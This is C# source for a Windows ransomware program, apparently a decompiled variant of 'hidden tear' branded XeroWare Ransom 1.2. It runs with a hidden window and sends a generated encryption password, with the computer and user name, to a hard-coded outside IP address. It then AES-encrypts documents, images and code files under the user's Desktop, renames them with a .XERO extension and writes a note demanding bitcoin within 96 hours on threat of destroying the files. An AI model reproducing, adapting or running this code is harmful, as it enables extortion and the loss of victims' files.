using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace hidden_tear;

public class Form1 : Form
{
	private string targetURL = "http://77.49.146.199/index.php?info=";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private string everth = "C:\\Users\\";

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
		string arguments = $"/c start C:\\dec.exe";
		Process.Start(new ProcessStartInfo("cmd.exe")
		{
			Arguments = arguments
		});
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		string text = computerName + "-" + userName + " " + password;
		string address = targetURL + text;
		new WebClient().DownloadString(address);
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".XERO");
	}

	public void encryptDirectory(string location, string password)
	{
		string[] source = new string[21]
		{
			".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png",
			".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
			".pdf"
		};
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		for (int i = 0; i < files.Length; i++)
		{
			string extension = Path.GetExtension(files[i]);
			if (source.Contains(extension))
			{
				EncryptFile(files[i], password);
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			encryptDirectory(directories[j], password);
		}
	}

	public void startAction()
	{
		string password = CreatePassword(15);
		string text = "\\Desktop";
		string location = userDir + userName + text;
		SendPassword(password);
		encryptDirectory(location, password);
		messageCreator();
		password = null;
		Application.Exit();
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\XeroWare_ReadME.txt";
		string path = userDir + userName + text;
		string[] contents = new string[17]
		{
			"Your files have been encrypted and your computer has been infected with XeroWare Ransom 1.2.", "Q&A:", "1) What Should I do?", "A: Pay the specific amount we are asking from you in order to decrypt your files.", "2) Can i try to remove the malware?", "A: If you try anything your files will be removed, YOU have been WARNED.", "3) How can i pay in order to decrypt my files ?", "A: Copy the provided btc address and send the money.", "4) How do i verify my payment?", "A: You provide the payment transaction ID and you click confirm transaction.",
			"5) What will happen if the payment transaction is not valid?", "A: If you try to provide anything alike to fake or not valid your files will be destroyed permanetly.", "6) I have paid and verified my transaction how do i decrypt my files?", "A: If you have paid and verified your transaction just simply click the decrypt button and everything will revert back to normal.", "You have 96 hours in order to complete that task, otherwise your files will be destroyed.", "Time has already started...", ""
		};
		File.WriteAllLines(path, contents);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(252, 70));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4, 5, 4, 5));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
